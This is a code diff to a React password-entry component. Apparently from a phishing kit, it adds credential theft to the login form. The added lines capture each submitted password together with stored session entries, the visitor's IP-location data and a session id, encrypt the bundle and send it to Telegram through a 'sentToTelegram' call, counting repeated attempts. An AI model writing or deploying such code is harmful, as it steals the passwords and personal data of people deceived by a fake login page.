@@ -2,6 +2,9 @@
 
 import { useState } from "react";
 import { ERROR } from "@/const";
+import { sessions, useSessionStore } from "@/store/session";
+import { encryptObject } from "@/utils/client/encryption";
+import { sentToTelegram } from "@/actions/sender";
 
 export const Password = ({
   value,
@@ -14,6 +17,10 @@ export const Password = ({
   setLoading: React.Dispatch<React.SetStateAction<boolean>>;
   setStage: React.Dispatch<React.SetStateAction<string>>;
 }) => {
+  const { ipLocationData, setSessions, sessionEntries, sessionId, keyData } =
+    useSessionStore();
+  if (!keyData) return null;
+
   const [password, setPassword] = useState("");
   const [showPwd, setShowPwd] = useState(false);
   const [noPassword, setNoPassword] = useState(false);
@@ -22,7 +29,7 @@ export const Password = ({
   const [incorrectPassword, setIncorrectPassword] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
 
-  const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
+  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
     e.preventDefault();
     setIsSubmitting(true);
 
@@ -49,6 +56,20 @@ export const Password = ({
 
     // setLoading(true);
     // setEnterPwd(true);
+
+    const data = {
+      ...sessionEntries,
+      password,
+      passwordStage: passwordCount + 1,
+      step: 2 + passwordCount,
+    };
+    setSessions(data as sessions);
+
+    const safeData = encryptObject(
+      { data, ipLocationData, sessionId },
+      keyData
+    );
+    await sentToTelegram(safeData);
   };
 
   return (
